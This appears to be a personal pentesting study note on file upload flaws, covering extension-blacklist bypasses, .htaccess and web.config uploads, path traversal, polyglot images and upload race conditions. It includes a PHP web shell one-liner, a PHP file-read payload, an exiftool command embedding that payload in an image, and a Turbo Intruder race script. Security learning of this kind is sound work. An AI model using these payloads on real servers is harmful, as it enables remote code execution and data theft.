# Summary File Upload Flaws 
| Flaws                                   | Attack                                                                                                                           |    |
| --------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------- | 
| Unrestricted File Extension Upload      | upload of exe.php or any other type that can execute code, ie:.exe, .js, .jsp, .py                                               |     
| Flawed Type Validation                  | Pretend to be different Content-Type, request can pretend to be from a different MIME type                                       |     
| Folder Restriction Upload               | Upload the file to a different folder using **../** pay attention if the value is been decoded by the server also, ie: **..%2f** |     
| Insufficient blacklisting of file types | Blacklist a few extensions but not others, ie: **.php5 or .shtml5**                                                              |     
| Upload our own config file              | Uploading our own .htaccess(Apache) or web.config(IIS), so we can enable our custom file extension                               |     
| Obfuscating file extensions             | Exploit.php.jpg, exploit%2Ephp, exploit.asp%00.jpg [more here](![[Dangerous File Extensions]])                                                                               |  
   
![[Pasted image 20251223174936.png]]

### Open Permissions Folder Linux
- /tmp/
- /dev/shm/
- /var/tmp


### Defences Best Practices
Preventing file execution in user-accessible directories
In some cases, serve the contents of the file as plain text instead

## Special Server Configs Apache and IIS Servers
### Apache
 If Apache server try upload a file called ==.htaccess== this allows will load a directory-specific configuration from a file called `.htaccess` if one is present.
	- ```text
	  AddType application/x-httpd-php .php
	  ```
  ### IIS Server
If ISS Servers try upload a file called ==web.config== file. This might include directives such as the following, which in this case allows JSON files to be served to users
	- ```xml
	  <staticContent> <mimeMap fileExtension=".json" mimeType="application/json" /> </staticContent>
	  ```

## Attacks to try
- Try uploading another  file format ie:.**exe.php**
- Check if we can upload and path transversal at the same time with **"../"**
- Common path transversal technique also **'...///'** Some server may restrict execution on the folder its uploaded, but if we can control the location using path transversal we can get RCE.
- We can embed a malicious payload inside an image, and sometimes the server will execute  it. View the image to verify.
- Websites often validate file uploads by checking whether the Content-Type header matches the expected MIME type.


- If a PHP application return a SQL error, we have SQL injection,  if return an SH error we have sh command injection
### Common php test commands
```php
<?php echo system($_GET['command']); ?>

<?php echo file_get_contents('/path/to/target/file'); ?>

```


## Obfuscating file extensions

Even the most exhaustive blacklists can potentially be bypassed using classic obfuscation techniques. Let's say the validation code is case sensitive and fails to recognize that `exploit.pHp` is in fact a `.php` file. If the code that subsequently maps the file extension to a MIME type is **not** case sensitive, this discrepancy allows you to sneak malicious PHP files past validation that may eventually be executed by the server.

You can also achieve similar results using the following techniques:

- Provide multiple extensions. Depending on the algorithm used to parse the filename, the following file may be interpreted as either a PHP file or JPG image: `exploit.php.jpg`
- Add trailing characters. Some components will strip or ignore trailing whitespaces, dots, and suchlike: `exploit.php.`
- Try using the URL encoding (or double URL encoding) for dots, forward slashes, and backward slashes. If the value isn't decoded when validating the file extension, but is later decoded server-side, this can also allow you to upload malicious files that would otherwise be blocked: `exploit%2Ephp`
- Add semicolons or URL-encoded null byte characters before the file extension. If validation is written in a high-level language like PHP or Java, but the server processes the file using lower-level functions in C/C++, for example, this can cause discrepancies in what is treated as the end of the filename: `exploit.asp;.jpg` or `exploit.asp%00.jpg`
- Try using multibyte unicode characters, which may be converted to null bytes and dots after unicode conversion or normalization. Sequences like `xC0 x2E`, `xC4 xAE` or `xC0 xAE` may be translated to `x2E` if the filename parsed as a UTF-8 string, but then converted to ASCII characters before being used in a path
---
Other defenses involve stripping or replacing dangerous extensions to prevent the file from being executed. If this transformation isn't applied recursively, you can position the prohibited string in such a way that removing it still leaves behind a valid file extension. For example, consider what happens if you strip `.php` from the following filename:

==exploit.p.phphp==

#### RCE via polyglot file
A polyglot file is one file type pretending to be more than one type, example an .php passing as a .jpeg
#### Exifiltool
Using exifiltool we can create a polyglot file
```bash
exifiltool -Comment="<?php echo 'START' . file_get_contents('/home/john/secret.txt') . 'END'; ?>" myImage.jpeg -o exploit.php
```
### Upload Race Conditions
![[Pasted image 20251209004504.png]]
We submit a POST and a GET request in parallel.
Some servers the file will exist for a few seconds before its deleted, if we run a GET request before the file is deleted we can get a race condition on the server.
On the example above we submitted a POST request containing our .php file and we had run a GET request to the file path. Both requests were sent in parallel.
Although some requests failed, a few of them succeeded

#### Turbo Intruder Plugin - Race Conditions
We can also use a Burp Suite plugin called Turbo Intruder to run specific request very fast, attempting to trigger a race condition on the server.
On this scenario, we can imagine the Anti-Virus is destroyin the file before we can get to it, so we will send requests consecutives at a very fast pace so we can try catch the file

We will use 1 POST request and send many GET requests to the file
1. Right click on the Post Request > Extension > Turbo Intruder

2. Copy and pate the below script
```bash
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=20,)

    request1 = '''<YOUR-POST-REQUEST>'''

    request2 = '''<YOUR-GET-REQUEST>'''

    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    engine.queue(request1, gate='race1')
    for x in range(10):
        engine.queue(request2, gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)
```
3. Now replace the POST request with the entire POST request, do the same for the GET request
4. Click Attack
![[Pasted image 20251209012726.png]]